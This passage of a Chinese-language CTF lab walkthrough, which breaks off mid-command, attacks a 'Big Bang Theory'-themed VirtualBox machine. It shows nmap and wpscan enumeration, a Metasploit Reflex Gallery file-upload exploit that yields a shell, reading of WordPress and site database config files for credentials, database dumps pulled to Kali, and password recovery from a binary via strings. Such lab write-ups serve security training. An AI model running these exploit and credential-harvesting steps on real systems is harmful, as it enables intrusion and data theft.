class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.1.105</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21&#x2F;tcp   open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| -rw-r--r--    1 ftp      ftp           539 Mar 04 01:11 Welcome.txt</span><br><span class="line">| -rw-r--r--    1 ftp      ftp           114 Mar 04 01:13 ftp_agreement.txt</span><br><span class="line">|_drwxr-xr-x    9 ftp      ftp          4096 Mar 04 01:09 pub</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.1.3</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 1</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 cf:5c:ee:76:7c:48:52:06:8d:56:07:7f:f6:5d:80:f2 (RSA)</span><br><span class="line">|   256 ab:bb:fa:f9:89:99:02:9e:e4:20:fa:37:4f:6f:ca:ca (ECDSA)</span><br><span class="line">|_  256 ea:6d:77:f3:ff:9c:d5:dd:85:e3:1e:75:3c:7b:66:47 (ED25519)</span><br><span class="line">80&#x2F;tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| http-robots.txt: 4 disallowed entries </span><br><span class="line">|_&#x2F;howard &#x2F;web_shell.php &#x2F;backdoor &#x2F;rootflag.txt</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Fun with flags!</span><br><span class="line">1337&#x2F;tcp open  waste?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: </span><br><span class="line">|_    FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port1337-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;3&#x2F;31%Time&#x3D;5E82D546%P&#x3D;x86_64-pc-linux-gnu%r(NU</span><br><span class="line">SF:LL,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(GenericLine</span><br><span class="line">SF:s,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(GetRequest,2</span><br><span class="line">SF:F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(HTTPOptions,2F,</span><br><span class="line">SF:&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(RTSPRequest,2F,&quot;F</span><br><span class="line">SF:LAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(RPCCheck,2F,&quot;FLAG-s</span><br><span class="line">SF:heldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(DNSVersionBindReqTCP,2F,</span><br><span class="line">SF:&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(DNSStatusRequestT</span><br><span class="line">SF:CP,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(Help,2F,&quot;FL</span><br><span class="line">SF:AG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(SSLSessionReq,2F,&quot;FL</span><br><span class="line">SF:AG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(TerminalServerCookie</span><br><span class="line">SF:,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(TLSSessionReq</span><br><span class="line">SF:,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(Kerberos,2F,&quot;</span><br><span class="line">SF:FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(SMBProgNeg,2F,&quot;FLA</span><br><span class="line">SF:G-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(X11Probe,2F,&quot;FLAG-she</span><br><span class="line">SF:ldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(FourOhFourRequest,2F,&quot;FLAG</span><br><span class="line">SF:-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(LPDString,2F,&quot;FLAG-she</span><br><span class="line">SF:ldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(LDAPSearchReq,2F,&quot;FLAG-she</span><br><span class="line">SF:ldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(LDAPBindReq,2F,&quot;FLAG-sheld</span><br><span class="line">SF:on&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(SIPOptions,2F,&quot;FLAG-sheldon&#123;</span><br><span class="line">SF:cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(LANDesk-RC,2F,&quot;FLAG-sheldon&#123;cf8</span><br><span class="line">SF:8b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(TerminalServer,2F,&quot;FLAG-sheldon&#123;cf</span><br><span class="line">SF:88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(NCP,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb1</span><br><span class="line">SF:0c4005c1f2781a069cf8&#125;\n&quot;)%r(NotesRPC,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c400</span><br><span class="line">SF:5c1f2781a069cf8&#125;\n&quot;)%r(JavaRMI,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f27</span><br><span class="line">SF:81a069cf8&#125;\n&quot;)%r(WMSRequest,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a</span><br><span class="line">SF:069cf8&#125;\n&quot;)%r(oracle-tns,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069</span><br><span class="line">SF:cf8&#125;\n&quot;)%r(ms-sql-s,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\</span><br><span class="line">SF:n&quot;)%r(afp,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;)%r(giop</span><br><span class="line">SF:,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\n&quot;);</span><br><span class="line">MAC Address: 08:00:27:F7:18:EC (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.012 days (since Tue Mar 31 01:13:02 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>nmap在扫描结果中就给出了FLAG-sheldon<br />实际上使用nc就能获得flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.1.105 1337</span><br><span class="line"></span><br><span class="line">FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;</span><br></pre></td></tr></table></figure><p><strong><code>FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;</code></strong></p><p>nmap在扫描时给出了80端口上<code>robots.txt</code>的相关信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http-robots.txt: 4 disallowed entries </span><br><span class="line">|_&#x2F;howard &#x2F;web_shell.php &#x2F;backdoor &#x2F;rootflag.txt</span><br></pre></td></tr></table></figure><p>测试之后发现只有<code>/howard</code>可以访问</p><h2 id="web路径枚举-14"><a class="markdownIt-Anchor" href="#web路径枚举-14"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径</p><p><code>dirb http://192.168.1.105/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.1.105&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.105&#x2F;index.html (CODE:200|SIZE:239)                                        </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;javascript&#x2F;                                              </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;                                                   </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;phpmyadmin&#x2F;                                              </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;private&#x2F;                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.105&#x2F;robots.txt (CODE:200|SIZE:112)                                        </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.105&#x2F;server-status (CODE:403|SIZE:301)</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F;</span><br></pre></td></tr></table></figure><p>可以看到存在phpmyadmin框架和wordpress框架</p><ul><li>访问<code>/private</code>，看起来像是一个自建的站点</li><li>尝试后发现<code>/private/login.php</code>，可以尝试SQL注入或者收集信息再进行登入爆破</li><li>访问<code>/howard</code></li><li><code>/howard/stolen_data/pennys_lastname.txt</code>中记录内容为<code>ERROR 404</code></li></ul><h2 id="漏洞利用-14"><a class="markdownIt-Anchor" href="#漏洞利用-14"></a> 漏洞利用</h2><p>使用wpscan对wordpress站点进行扫描</p><p><code>wpscan --url http://192.168.1.105/music/wordpress -e u</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] footprintsonthemoon</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] kripke</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] stuart</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>得到三个账户的用户名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress -e ap</span><br><span class="line"></span><br><span class="line">[+] reflex-gallery</span><br><span class="line"> | Location: http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;reflex-gallery&#x2F;</span><br><span class="line"> | Last Updated: 2019-05-10T16:05:00.000Z</span><br><span class="line"> | [!] The version is out of date, the latest version is 3.1.7</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 3.1.3 (80% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;reflex-gallery&#x2F;readme.txt</span><br></pre></td></tr></table></figure><p>得到插件信息</p><p>搜索插件相关信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">searchsploit reflex gallery</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                       |  Path</span><br><span class="line">                                                                     | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)</span><br><span class="line">--------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">WordPress Plugin Reflex Gallery - Arbitrary File Upload (Metasploit) | exploits&#x2F;php&#x2F;remote&#x2F;36809.rb</span><br><span class="line">WordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File Upload        | exploits&#x2F;php&#x2F;webapps&#x2F;36374.txt</span><br><span class="line">--------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure><p>在MSF中搜索相关EXP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">search reflex</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit&#x2F;unix&#x2F;webapp&#x2F;wp_reflexgallery_file_upload  2012-12-30       excellent  Yes    Wordpress Reflex Gallery Upload Vulnerability</span><br></pre></td></tr></table></figure><p>使用EXP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;unix&#x2F;webapp&#x2F;wp_reflexgallery_file_upload</span><br><span class="line">set RHOSTS 192.168.1.105</span><br><span class="line">set TARGETURI &#x2F;music&#x2F;wordpress</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>成功获取Shell</p><h2 id="权限提升-14"><a class="markdownIt-Anchor" href="#权限提升-14"></a> 权限提升</h2><ul><li>FLAG-raz</li></ul><p>获取tty</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>查看wordpress的数据库配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;html&#x2F;music&#x2F;wordpress&#x2F;wp-config.php | grep -i db</span><br><span class="line"></span><br><span class="line">define( &#39;DB_NAME&#39;, &#39;footprintsonthemoon&#39; );</span><br><span class="line">define( &#39;DB_USER&#39;, &#39;footprintsonthemoon&#39; );</span><br><span class="line">define( &#39;DB_PASSWORD&#39;, &#39;footprintsonthemoon1337&#39; );</span><br><span class="line">define( &#39;DB_HOST&#39;, &#39;localhost&#39; );</span><br><span class="line">define( &#39;DB_CHARSET&#39;, &#39;utf8mb4&#39; );</span><br><span class="line">define( &#39;DB_COLLATE&#39;, &#39;&#39; );</span><br></pre></td></tr></table></figure><p>连接数据库<br /><code>mysql -h localhost -u footprintsonthemoon -pfootprintsonthemoon1337 footprintsonthemoon</code></p><p>查看数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">+---------------------+</span><br><span class="line">| Database            |</span><br><span class="line">+---------------------+</span><br><span class="line">| information_schema  |</span><br><span class="line">| footprintsonthemoon |</span><br><span class="line">+---------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>退出mysql并导出数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br><span class="line">mysqldump -h localhost -u footprintsonthemoon -pfootprintsonthemoon1337 --databases footprintsonthemoon &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;dump.sql</span><br></pre></td></tr></table></figure><p>在Kali中下载备份</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O http:&#x2F;&#x2F;192.168.1.105&#x2F;dump.sql</span><br></pre></td></tr></table></figure><p>查找flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat dump.sql | grep &quot;FLAG&quot; --color&#x3D;auto</span><br><span class="line"></span><br><span class="line">FLAG-raz&#123;40d17a74e28a62eac2df19e206f0987c&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里导出的数据在Kali中用grep节选时如果没有用高亮就很难找</p></blockquote><ul><li>FLAG-bernadette</li></ul><p>查看<code>/private</code>站点的数据库配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;html&#x2F;private&#x2F;db_config.php | grep -i db</span><br><span class="line"></span><br><span class="line">$DBUSER &#x3D; &#39;bigpharmacorp&#39;;</span><br><span class="line">$DBPASS &#x3D; &#39;weareevil&#39;;</span><br><span class="line">$con&#x3D;mysqli_connect(&quot;127.0.0.1&quot;,$DBUSER,$DBPASS,&quot;bigpharmacorp&quot;);</span><br></pre></td></tr></table></figure><p>连接数据库<br /><code>mysql -h localhost -u bigpharmacorp -pweareevil</code></p><p>查找flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| bigpharmacorp      |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">use bigpharmacorp；</span><br><span class="line"></span><br><span class="line">show tables;</span><br><span class="line">+-------------------------+</span><br><span class="line">| Tables_in_bigpharmacorp |</span><br><span class="line">+-------------------------+</span><br><span class="line">| products                |</span><br><span class="line">| users                   |</span><br><span class="line">+-------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">select * from users;</span><br><span class="line">+----+------------+----------------------------------+------------+---------------------------------------------------+</span><br><span class="line">| id | username   | password                         | fname      | description                                       |</span><br><span class="line">+----+------------+----------------------------------+------------+---------------------------------------------------+</span><br><span class="line">|  1 | admin      | 3fc0a7acf087f549ac2b266baf94b8b1 | josh       | Dont mess with me                                 |</span><br><span class="line">|  2 | bobby      | 8cb1fb4a98b9c43b7ef208d624718778 | bob        | I like playing football.                          |</span><br><span class="line">|  3 | penny69    | cafa13076bb64e7f8bd480060f6b2332 | penny      | Hi I am Penny I am new here!! &lt;3                  |</span><br><span class="line">|  4 | mitsos1981 | 05d51709b81b7e0f1a9b6b4b8273b217 | dimitris   | Opa re malaka!                                    |</span><br><span class="line">|  5 | alicelove  | e146ec4ce165061919f887b70f49bf4b | alice      | Eat Pray Love                                     |</span><br><span class="line">|  6 | bernadette | dc5ab2b32d9d78045215922409541ed7 | bernadette | FLAG-bernadette&#123;f42d950ab0e966198b66a5c719832d5f&#125; |</span><br><span class="line">+----+------------+----------------------------------+------------+---------------------------------------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><strong><code>FLAG-bernadette&#123;f42d950ab0e966198b66a5c719832d5f&#125;</code></strong></p><ul><li>FLAG-amy</li></ul><p>收集信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;home&#x2F;amy&#x2F;</span><br><span class="line">total 12</span><br><span class="line">-rwxrwxrwx 1 amy amy  434 Mar  4 16:30 notes.txt</span><br><span class="line">-rwxr-xr-x 1 amy amy 7488 Mar  6 00:06 secretdiary</span><br><span class="line"></span><br><span class="line">cat &#x2F;home&#x2F;amy&#x2F;notes.txt</span><br><span class="line">This is my secret diary.</span><br><span class="line">The safest way to keep my secrets is inside a compiled executable program.</span><br><span class="line">As soon as I get popular now, that I have friends, I will start adding my secrets here.</span><br><span class="line">I have used a really strong password that it cant be bruteforced.</span><br><span class="line">Seriously it is 18 digit, alphanumeric, uppercase&#x2F;lowercase with symbols.</span><br><span class="line">And since my program is already compiled, no one can read the source code in order to view the password!</span><br></pre></td></tr></table></figure><p>可以判断<code>/home/amy/secretdiary</code>是一个可执行程序</p><p>使用strings命令查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">strings secretdiary</span><br><span class="line"></span><br><span class="line">P@SSw0rd123Sh3ld0n</span><br><span class="line">Login Success!</span><br><span class="line">Soon I will be adding my secrets here..</span><br><span class="line">FLAG-amy&#123;60263777358690b90e8dbe8fea6943c9&#125;</span><br></pre></td></tr></table></figure><p><strong><code>FLAG-amy&#123;60263777358690b90e8dbe8fea6943c9&#125;</code></strong></p><ul><li>FLAG-penny</li></ul><p>收集信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ls -la &#x2F;home&#x2F;penny</span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x  4 penny penny 4096 Mar  6 00:37 .</span><br><span class="line">drwxr-xr-x 10 root  root  4096 Mar  4 02:33 ..</span><br><span class="line">-rw-rw-r--  1 penny penny   61 Mar  5 00:26 .FLAG.penny.txt</span><br><span class="line">-rw-------  1 penny penny   57 Mar  6 00:47 .bash_history</span><br><span class="line">-rw-r--r--  1 penny penny  220 Sep  1  2015 .bash_logout</span><br><span class="line">-rw-r--r--  1 penny penny 3771 Sep  1  2015 .bashrc</span><br><span class="line">drwx------  2 penny penny 4096 Mar  6 00:37 .cache</span><br><span class="line">drwxrwxr-x  2 penny penny 4096 Mar  5 00:26 .nano</span><br><span class="line">-rw-r--r--  1 penny penny  655 May 16  2017 .profile</span><br><span class="line"></span><br><span class="line">cat &#x2F;home&#x2F;penny&#x2F;.FLAG.penny.txt</span><br><span class="line">RkxBRy1wZW5ueXtkYWNlNTJiZGIyYTBiM2Y4OTlkZmIzNDIzYTk5MmIyNX0&#x3D;</span><br></pre></td></tr></table></figure><p>base64 decode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;RkxBRy1wZW5ueXtkYWNlNTJiZGIyYTBiM2Y4OTlkZmIzNDIzYTk5MmIyNX0&#x3D;&quot; | base64 -d</span><br><span class="line">FLAG-penny&#123;dace52bdb2a0b3f899dfb3423a992b25&#125;</span><br></pre></td></tr></table></figure><p><strong><code>FLAG-penny&#123;dace52bdb2a0b3f899dfb3423a992b25&#125;</code></strong></p><ul><li>FLAG-howard</li></ul><p>将FTP根目录打包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r &#x2F;var&#x2F;www&#x2F;html&#x2F;ftp.zip &#x2F;var&#x2F;ftp</span><br></pre></td></tr></table></figure><p>在Kali下载并解压</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -O 